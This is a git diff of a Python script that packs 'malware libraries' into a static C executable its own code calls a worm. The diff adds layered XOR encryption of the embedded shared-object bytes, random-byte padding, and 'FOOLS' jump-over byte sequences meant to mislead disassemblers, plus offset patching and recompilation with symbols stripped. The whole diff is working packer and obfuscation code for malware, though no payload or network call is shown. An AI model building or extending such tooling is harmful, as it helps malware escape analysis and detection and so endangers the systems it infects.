@@ -14,7 +14,7 @@ from random import randint
 ###
 # class to convert all information of a malware library into valid c-code that can be injected into the main.c-file
 class MaLibrary:
-    def __init__(self, name, got_mappings, data, data_length, entry_address, key, elf_offset_data="0x1a4", elf_offset_key="0x1a4"):
+    def __init__(self, name, got_mappings, data, data_length, entry_address, key):
         self.name = name
         self.got_offsets = "{" + ", ".join([key for key in got_mappings]) + "}"
         self.got_targets = "{" + ", ".join([got_mappings[key] for key in got_mappings]) + "}"
@@ -22,37 +22,39 @@ class MaLibrary:
         self.data = data
         self.data_length = data_length
         self.entry_offset = entry_address
-        self.key = key
-        self.elf_offset_data = elf_offset_data
-        self.elf_offset_key = elf_offset_key
+        self.key = int.from_bytes(bytes.fromhex(hex(key)[2:].ljust(16,'0'))[::-1]) # store key in reverse order, as bytes will be stored differently in memory
+        self.elf_offset_data = "0x0"
+        self.elf_offset_key = "0x0"
+        self.fools_offsets = []
 
     def setup_string(self):
-            # TODO: add asm code obfuscation
-            # __asm__(
-            #     ".intel_syntax noprefix\\n"
-            #     ".byte 0xeb, 0x8\\n"
-            #     ".quad {hex(self.key)}\\n"
-            #     ".att_syntax\\n"
-            # );
+        fools = "{" + ", ".join([offset for offset in self.fools_offsets]) + "}"
         return f"""
+            FOOLS;
             *libp = malloc(sizeof(MaLib));
             MaLib *lib = *libp;
             char {self.name}_data[] = "{self.data}";
             uint64_t {self.name}_data_length = {self.data_length};
             uint64_t {self.name}_entry_offset = {self.entry_offset};
-            uint64_t {self.name}_offsets[] = {self.got_offsets};
-            uint64_t {self.name}_targets[] = {self.got_targets};
+            uint64_t {self.name}_got_offsets[] = {self.got_offsets};
+            uint64_t {self.name}_got_targets[] = {self.got_targets};
             size_t {self.name}_n_got_mappings = {self.got_mappings_count};
+            FOOLS;
             uint64_t {self.name}_key = {hex(self.key)};
-            lib->got_offsets = {self.name}_offsets;
-            lib->got_targets = {self.name}_targets;
+            uint64_t {self.name}_fools_offsets[] = {fools};
+            lib->got_offsets = {self.name}_got_offsets;
+            lib->got_targets = {self.name}_got_targets;
             lib->n_got_mappings = {self.name}_n_got_mappings;
+            FOOLS;
             lib->data = {self.name}_data;
             lib->data_length = {self.name}_data_length;
             lib->entry_offset = {self.name}_entry_offset;
+            FOOLS;
             lib->key = {self.name}_key;
             lib->elf_offset_data = {self.elf_offset_data};
             lib->elf_offset_key = {self.elf_offset_key};
+            lib->n_fools_offsets = {len(self.fools_offsets)};
+            lib->fools_offsets = {self.name}_fools_offsets;
         """
 
 ###
@@ -122,8 +124,12 @@ def get_bytes_so(sections):
     for section in sections:
         # add a padding between the sections in case there is space in between
         padding = section.address - pos
-        bs += b"".join([b"x" * padding])  # todo: use random bytes or sth...
-        # print(f"Write section '{section.name}' to address {hex(len(bs))}")
+        
+        # fill the padding with random bytes
+        for i in range(padding):
+            bs += int.to_bytes(randint(0x01, 0xff))
+        
+        # add the content of the section
         bs += section.bytes
         pos = section.address + section.size
 
@@ -164,43 +170,89 @@ def get_offset(objdump, name):
         return int(findings[0], 16)
     return None
 
-
 ###
 # generate the code to insert into the main.c in order to setup the encrypted malware libraries
 def get_module_setup_code(code, lib: MaLibrary):
     return code.replace("<lib_setup>", lib.setup_string())
 
 ###
-# xor-encrypt the data; default key is 0x00 -> only encoding to bytes
-def xor_encrypt(bs, key=0x00):
-    b_enc = ""
-    key = hex(key)[2:].ljust(16, '0')
-    for i in range(0, len(bs),4):
-        # current byte of the data
-        c = int(bs[i:i+4], 16)
-
-        # the current byte of the key (iterate from the back, because key will be little endian uint64)
-        i_k = len(key) - i//2 % len(key) - 2
-        k = int(key[i_k:i_k+2], 16)
-
-        # encrypt the current byte of data with the corresponding byte of the key
-        b_enc += "\\x{:02x}".format(c^k)
-    return b_enc
+# xor encrypt the data with layered xor-encryption logic (len(key) layers; for each layer, shift encryption start position by i positions and skip i bytes of data between each encryption)
+def xor_encrypt_layered(bs, key=0x00):
+    bs = bytearray.fromhex(bs.replace("0x",""))
+    key = bytes.fromhex(hex(key)[2:].ljust(16, '0'))
+    for i in range(len(key)):
+        ik = 0
+        for ib in range(i, len(bs), i + 1):
+            bs[ib] ^= key[ik]
+            ik = (ik + i + 1 ) % len(key)
+    return "".join(["\\x{:02x}".format(b) for b in bs])
+    
 
 ###
 # generate a random 8byte key (uint64)
 def generate_key():
-    #return 0x9090909090909090
     return int("0x"+"".join(["{:02x}".format(randint(0x01, 0xff)) for i in range(8)]), base=16)
 
-def get_key_offset(file, key):
-    sequence = b"\xeb\x08" + bytes.fromhex(hex(key)[2:])[::-1]
+###
+# get data offset
+def get_libdata_offset(file, libdata):
     with open(file, "rb") as f:
         data = f.read()
-        index = data.find(sequence)
-        if index is not None:
-            return index + 2
-    return -1
+        index = data.find(libdata)
+        if index is not None and index >= 0:
+            return index
+    return None
+
+###
+# get offsets of all the FOOL_LS bytes
+def get_fools_offsets(file):
+    sequence = b"\xeb\x08" + b"\x90"*8
+    offsets = []
+    last_idx = 0x0
+    with open(file, "rb") as f:
+        data = f.read()
+        while True:
+            index = data.find(sequence, last_idx)
+            if index is None or index < 0:
+                break
+            offsets.append(hex(index+2))
+            last_idx = index + 10
+    return offsets
+
+
+def compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, strip=False):
+
+    # extract the actual offset of the key in the compiled binary
+    dump = bash(f"objdump -d -M intel {outbinary}")
+    for line in dump.split("\n"):
+        if hex(lib.key) in line:
+            # check for the address of the key and rebuild the program
+            lib.elf_offset_key  = hex(int(line.strip().split(':')[0][2:], 16) + 2)
+            break
+            
+    # extract the actual offset of the data/code in the compiled binary
+    lib_offset = get_libdata_offset(outbinary, bytes.fromhex(data.replace("\\x", "")))
+    if lib_offset is None:
+        raise LookupError("Data not found!")
+    lib.elf_offset_data = hex(lib_offset)
+    
+    # get the offsets for the fooling LS bytes
+    lib.fools_offsets = get_fools_offsets(outbinary)
+    
+    # prepare the code for compilation; insert the data for the MaLibraries
+    code = get_module_setup_code(code_original, lib)
+
+    # write the code to a file
+    outfile = open(out, "w")
+    outfile.write(code)
+    outfile.close()
+
+    flag = "-g"
+    if strip:
+        flag = "-s"
+    # compile the final program as a static executable, containing all the necessary code and data
+    bash(f"{gcc} {flag} -static -o {outbinary} {out}")   # -s to strip all the debug-symbols
+
 
 ############
 ## CONFIG ##
@@ -251,15 +303,15 @@ def pack(module):
     # get the .GOT mappings
     got_mappings = get_got_mappings(so_file, objdump)
 
-    # get the bytes of the shared object and xor_encrypt them
-    key = generate_key()
-    print(f"Key: {hex(key)}")
-    data = get_bytes_so(sections)
-    data = xor_encrypt(data, key)
-
     # get the address of the entry-function
     entry = get_entry(objdump)
-    
+
+    # get the bytes of the shared object and xor_encrypt them
+    data = get_bytes_so(sections)
+    key = generate_key()
+    print(f"Key: {hex(key)}")
+    data = xor_encrypt_layered(data, key)
+
     # store the malicious library in the list
     lib = MaLibrary(module, got_mappings, data, len(data)//4, entry, key)
 
@@ -272,41 +324,13 @@ def pack(module):
     outfile.close()
 
     # compile the final program as a static executable, containing all the necessary code and data
-    bash(f"{gcc} -g -static -o {outbinary} {out}")   # TODO: remove -g later, just for testing
+    bash(f"{gcc} -g -static -o {outbinary} {out}")   # keep -g here to be able to easily extract information using objdump. Will be re-compiled later
 
+    compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, strip=False)
 
-    # extract the actual offset of the key in the compiled binary
-    # TODO: put the key in the obfuscated jmp bytes section; update binary to also read the key from there
-    # key_offset = get_key_offset(outbinary, key)
-    # if key_offset == -1:
-    #     raise KeyError("Key not found in binary!")
-    # lib.elf_offset_key = hex(key_offset)
-
-    dump = bash(f"objdump -d -M intel {outbinary}")
-    for line in dump.split("\n"):
-        if hex(key) in line:
-            # check for the address of the key and rebuild the program
-            lib.elf_offset_key  = hex(int(line.strip().split(':')[0][2:], 16) + 2)
-            break
-            
-    # extract the actual offset of the data/code in the compiled binary
-    dump = bash(f"objdump -h {outbinary}")
-    for line in dump.split("\n"):
-        if ".rodata" in line:
-            # check for the address of the data and rebuild the program
-            lib.elf_offset_data  = hex(int(line.strip().split('  ')[-2], 16) + 8)
-            break
-    
-    # prepare the code for compilation; insert the data for the MaLibraries
-    code = get_module_setup_code(code_original, lib)
-
-    # write the code to a file
-    outfile = open(out, "w")
-    outfile.write(code)
-    outfile.close()
-
-    # compile the final program as a static executable, containing all the necessary code and data
-    bash(f"{gcc} -g -static -o {outbinary} {out}")   # TODO: remove -g later, just for testing
+    # since setting the offsets for the fools-array actually changes the offsets, the process needs to be repeated
+    # redo the last compilation to get correct fools offsets
+    compile_worm_with_all_offsets(code_original, lib, outbinary, out, data, strip=True)
 
     # print the file-info of the compiled binary
     bash(f"file {outbinary}", verbose=True)
